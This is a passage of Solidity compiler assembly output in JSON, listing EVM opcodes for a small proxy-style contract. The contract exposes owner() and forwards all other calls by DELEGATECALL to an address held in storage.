								{
									"begin": 800,
									"end": 833,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "25"
								},
								{
									"begin": 827,
									"end": 832,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 800,
									"end": 833,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "12"
								},
								{
									"begin": 800,
									"end": 833,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 800,
									"end": 833,
									"name": "tag",
									"source": 1,
									"value": "25"
								},
								{
									"begin": 800,
									"end": 833,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 696,
									"end": 839,
									"name": "SWAP3",
									"source": 1
								},
								{
									"begin": 696,
									"end": 839,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 696,
									"end": 839,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 696,
									"end": 839,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 696,
									"end": 839,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 845,
									"end": 1196,
									"name": "tag",
									"source": 1,
									"value": "3"
								},
								{
									"begin": 845,
									"end": 1196,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 915,
									"end": 921,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 964,
									"end": 966,
									"name": "PUSH",
									"source": 1,
									"value": "20"
								},
								{
									"begin": 952,
									"end": 961,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 943,
									"end": 950,
									"name": "DUP5",
									"source": 1
								},
								{
									"begin": 939,
									"end": 962,
									"name": "SUB",
									"source": 1
								},
								{
									"begin": 935,
									"end": 967,
									"name": "SLT",
									"source": 1
								},
								{
									"begin": 932,
									"end": 1051,
									"name": "ISZERO",
									"source": 1
								},
								{
									"begin": 932,
									"end": 1051,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "27"
								},
								{
									"begin": 932,
									"end": 1051,
									"name": "JUMPI",
									"source": 1
								},
								{
									"begin": 970,
									"end": 1049,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "28"
								},
								{
									"begin": 970,
									"end": 1049,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "8"
								},
								{
									"begin": 970,
									"end": 1049,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 970,
									"end": 1049,
									"name": "tag",
									"source": 1,
									"value": "28"
								},
								{
									"begin": 970,
									"end": 1049,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 932,
									"end": 1051,
									"name": "tag",
									"source": 1,
									"value": "27"
								},
								{
									"begin": 932,
									"end": 1051,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 1090,
									"end": 1091,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 1115,
									"end": 1179,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "29"
								},
								{
									"begin": 1171,
									"end": 1178,
									"name": "DUP5",
									"source": 1
								},
								{
									"begin": 1162,
									"end": 1168,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 1151,
									"end": 1160,
									"name": "DUP6",
									"source": 1
								},
								{
									"begin": 1147,
									"end": 1169,
									"name": "ADD",
									"source": 1
								},
								{
									"begin": 1115,
									"end": 1179,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "13"
								},
								{
									"begin": 1115,
									"end": 1179,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 1115,
									"end": 1179,
									"name": "tag",
									"source": 1,
									"value": "29"
								},
								{
									"begin": 1115,
									"end": 1179,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 1105,
									"end": 1179,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 1105,
									"end": 1179,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 1061,
									"end": 1189,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 845,
									"end": 1196,
									"name": "SWAP3",
									"source": 1
								},
								{
									"begin": 845,
									"end": 1196,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 845,
									"end": 1196,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 845,
									"end": 1196,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 845,
									"end": 1196,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 233,
									"end": 560,
									"name": "tag",
									"source": 0,
									"value": "6"
								},
								{
									"begin": 233,
									"end": 560,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 233,
									"end": 560,
									"name": "PUSH #[$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 233,
									"end": 560,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 233,
									"end": 560,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 233,
									"end": 560,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 233,
									"end": 560,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 233,
									"end": 560,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 233,
									"end": 560,
									"name": "RETURN",
									"source": 0
								}
							],
							".data": {
								"0": {
									".auxdata": "a2646970667358221220976c2cd3ca30ab452c5f67efaa7af1159490664a92dc9a7cf70a4a335e94608564736f6c63430008110033",
									".code": [
										{
											"begin": 233,
											"end": 560,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 233,
											"end": 560,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 233,
											"end": 560,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 233,
											"end": 560,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 233,
											"end": 560,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 233,
											"end": 560,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 233,
											"end": 560,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 233,
											"end": 560,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 233,
											"end": 560,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 233,
											"end": 560,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 233,
											"end": 560,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 233,
											"end": 560,
											"name": "tag",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 233,
											"end": 560,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 233,
											"end": 560,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 233,
											"end": 560,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 233,
											"end": 560,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 233,
											"end": 560,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 233,
											"end": 560,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 233,
											"end": 560,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 233,
											"end": 560,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 233,
											"end": 560,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 233,
											"end": 560,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 233,
											"end": 560,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 233,
											"end": 560,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 233,
											"end": 560,
											"name": "PUSH",
											"source": 0,
											"value": "8DA5CB5B"
										},
										{
											"begin": 233,
											"end": 560,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 233,
											"end": 560,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 233,
											"end": 560,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 233,
											"end": 560,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 233,
											"end": 560,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 233,
											"end": 560,
											"name": "tag",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 233,
											"end": 560,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 233,
											"end": 560,
											"name": "tag",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 233,
											"end": 560,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 456,
											"end": 467,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 480,
											"end": 488,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 480,
											"end": 488,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 480,
											"end": 488,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 480,
											"end": 488,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 480,
											"end": 488,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 480,
											"end": 488,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 480,
											"end": 488,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 480,
											"end": 488,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 480,
											"end": 488,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 480,
											"end": 488,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 480,
											"end": 488,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 472,
											"end": 502,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 472,
											"end": 502,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 503,
											"end": 511,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 503,
											"end": 511,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 472,
											"end": 512,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 472,
											"end": 512,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 472,
											"end": 512,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 472,
											"end": 512,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 472,
											"end": 512,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 472,
											"end": 512,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 472,
											"end": 512,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 472,
											"end": 512,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 472,
											"end": 512,
											"name": "tag",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 472,
											"end": 512,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 472,
											"end": 512,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 472,
											"end": 512,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 472,
											"end": 512,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 472,
											"end": 512,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 472,
											"end": 512,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 472,
											"end": 512,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 472,
											"end": 512,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 472,
											"end": 512,
											"name": "DUP6",
											"source": 0
										},
										{
											"begin": 472,
											"end": 512,
											"name": "GAS",
											"source": 0
										},
										{
											"begin": 472,
											"end": 512,
											"name": "DELEGATECALL",
											"source": 0
										},
										{
											"begin": 472,
											"end": 512,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 472,
											"end": 512,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 472,
											"end": 512,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 472,
											"end": 512,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 472,
											"end": 512,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 472,
											"end": 512,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 472,
											"end": 512,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 472,
											"end": 512,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 472,
											"end": 512,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 472,
											"end": 512,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 472,
											"end": 512,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 472,
											"end": 512,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 472,
											"end": 512,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 472,
											"end": 512,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 472,
											"end": 512,
											"name": "PUSH",
											"source": 0,
											"value": "1F"
										},
										{
											"begin": 472,
											"end": 512,
											"name": "NOT",
											"source": 0
										},
										{
											"begin": 472,
											"end": 512,
											"name": "PUSH",
											"source": 0,
											"value": "3F"
										},
										{
											"begin": 472,
											"end": 512,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 472,
											"end": 512,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 472,
											"end": 512,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 472,
											"end": 512,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 472,
											"end": 512,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 472,
											"end": 512,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 472,
											"end": 512,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 472,
											"end": 512,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 472,
											"end": 512,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 472,
											"end": 512,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 472,
											"end": 512,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 472,
											"end": 512,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 472,
											"end": 512,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 472,
											"end": 512,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 472,
											"end": 512,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 472,
											"end": 512,
											"name": "RETURNDATACOPY",
											"source": 0
										},
										{
											"begin": 472,
											"end": 512,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 472,
											"end": 512,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 472,
											"end": 512,
											"name": "tag",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 472,
											"end": 512,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 472,
											"end": 512,
											"name": "PUSH",
											"source": 0,
											"value": "60"
										},
										{
											"begin": 472,
											"end": 512,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 472,
											"end": 512,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 472,
											"end": 512,
											"name": "tag",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 472,
											"end": 512,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 472,
											"end": 512,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 260,
											"end": 280,
											"name": "tag",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 260,
											"end": 280,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 260,
											"end": 280,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 260,
											"end": 280,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 260,
											"end": 280,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 260,
											"end": 280,
											"name": "tag",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 260,
											"end": 280,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 260,
											"end": 280,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 260,
											"end": 280,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 260,
											"end": 280,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 260,
											"end": 280,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 260,
											"end": 280,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 260,
											"end": 280,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 260,
											"end": 280,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 260,
											"end": 280,
											"name": "tag",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 260,
											"end": 280,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 260,
											"end": 280,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 260,
											"end": 280,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 260,
											"end": 280,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 260,
											"end": 280,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 260,
											"end": 280,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 260,
											"end": 280,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 260,
											"end": 280,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 260,
											"end": 280,
											"name": "tag",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 260,
											"end": 280,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 260,
											"end": 280,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 260,
											"end": 280,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 260,
											"end": 280,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 260,
											"end": 280,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 260,
											"end": 280,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 260,
											"end": 280,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 260,
											"end": 280,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 260,
											"end": 280,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 260,
											"end": 280,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 260,
											"end": 280,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 260,
											"end": 280,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 260,
											"end": 280,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 7,
											"end": 154,
											"name": "tag",
											"source": 1,
											"value": "17"
										},
										{
											"begin": 7,
											"end": 154,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 108,
											"end": 119,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 145,
											"end": 148,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 130,
											"end": 148,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 130,
											"end": 148,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 7,
											"end": 154,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 7,
											"end": 154,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 7,
											"end": 154,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 7,
											"end": 154,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 7,
											"end": 154,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 160,
											"end": 306,
											"name": "tag",
											"source": 1,
											"value": "18"
										},
										{
											"begin": 160,
											"end": 306,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 257,
											"end": 263,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 252,
											"end": 255,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 247,
											"end": 250,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 234,
											"end": 264,
											"name": "CALLDATACOPY",
											"source": 1
										},
										{
											"begin": 298,
											"end": 299,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 289,
											"end": 295,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 284,
											"end": 287,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 280,
											"end": 296,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 273,
											"end": 300,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 160,
											"end": 306,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 160,
											"end": 306,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 160,
											"end": 306,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 160,
											"end": 306,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 334,
											"end": 661,
											"name": "tag",
											"source": 1,
											"value": "19"
										},
										{
											"begin": 334,
											"end": 661,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 448,
											"end": 451,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 469,
											"end": 557,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "27"
										},
										{
											"begin": 550,
											"end": 556,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 545,
											"end": 548,
											"name": "DUP6",
											"source": 1
										},
										{
											"begin": 469,
											"end": 557,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "17"
										},
										{
											"begin": 469,
											"end": 557,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 469,
											"end": 557,
											"name": "tag",
											"source": 1,
											"value": "27"
										},
										{
											"begin": 469,
											"end": 557,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 462,
											"end": 557,
											"name": "SWAP4",
											"source": 1
										},
										{
											"begin": 462,
											"end": 557,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 567,
											"end": 623,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "28"
										},
										{
											"begin": 616,
											"end": 622,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 611,
											"end": 614,
											"name": "DUP6",
											"source": 1
										},
										{
											"begin": 604,
											"end": 609,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 567,
											"end": 623,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "18"
										},
										{
											"begin": 567,
											"end": 623,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 567,
											"end": 623,
											"name": "tag",
											"source": 1,
											"value": "28"
										},
										{
											"begin": 567,
											"end": 623,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 648,
											"end": 654,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 643,
											"end": 646,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 639,
											"end": 655,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 632,
											"end": 655,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 632,
											"end": 655,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 334,
											"end": 661,
											"name": "SWAP4",
											"source": 1
										},
										{
											"begin": 334,
											"end": 661,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 334,
											"end": 661,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 334,
											"end": 661,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 334,
											"end": 661,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 334,
											"end": 661,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 667,
											"end": 958,
											"name": "tag",
											"source": 1,
											"value": "8"
										},
										{
											"begin": 667,
											"end": 958,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 807,
											"end": 810,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 829,
											"end": 932,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "30"
										},
										{
											"begin": 928,
											"end": 931,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 919,
											"end": 925,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 911,
											"end": 917,
											"name": "DUP7",
											"source": 1
										},
										{
											"begin": 829,
											"end": 932,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "19"
										},
										{
											"begin": 829,
											"end": 932,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 829,
											"end": 932,
											"name": "tag",
											"source": 1,
											"value": "30"
										},
										{
											"begin": 829,
											"end": 932,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 822,
											"end": 932,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 822,
											"end": 932,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 949,
											"end": 952,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 942,
											"end": 952,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 942,
											"end": 952,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 667,
											"end": 958,
											"name": "SWAP4",
											"source": 1
										},
										{
											"begin": 667,
											"end": 958,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 667,
											"end": 958,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 667,
											"end": 958,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 667,
											"end": 958,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 667,
											"end": 958,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 964,
											"end": 1090,
											"name": "tag",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 964,
											"end": 1090,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1001,
											"end": 1008,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1041,
											"end": 1083,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1034,
											"end": 1039,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1030,
											"end": 1084,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 1019,
											"end": 1084,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1019,
											"end": 1084,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 964,
											"end": 1090,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 964,
											"end": 1090,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 964,
											"end": 1090,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 964,
											"end": 1090,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 1096,
											"end": 1192,
											"name": "tag",
											"source": 1,
											"value": "21"
										},
										{
											"begin": 1096,
											"end": 1192,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1133,
											"end": 1140,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1162,
											"end": 1186,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "33"
										},
										{
											"begin": 1180,
											"end": 1185,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1162,
											"end": 1186,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1162,
											"end": 1186,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 1162,
											"end": 1186,
											"name": "tag",
											"source": 1,
											"value": "33"
										},
										{
											"begin": 1162,
											"end": 1186,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1151,
											"end": 1186,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1151,
											"end": 1186,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1096,
											"end": 1192,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1096,
											"end": 1192,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1096,
											"end": 1192,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1096,
											"end": 1192,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 1198,
											"end": 1316,
											"name": "tag",
											"source": 1,
											"value": "22"
										},
										{
											"begin": 1198,
											"end": 1316,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1285,
											"end": 1309,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "35"
										},
										{
											"begin": 1303,
											"end": 1308,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1285,
											"end": 1309,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "21"
										},
										{
											"begin": 1285,
											"end": 1309,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 1285,
											"end": 1309,
											"name": "tag",
											"source": 1,
											"value": "35"
										},
										{
											"begin": 1285,
											"end": 1309,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1280,
											"end": 1283,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1273,
											"end": 1310,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1198,
											"end": 1316,
											"name": "POP",
											"source": 1
										},
										{
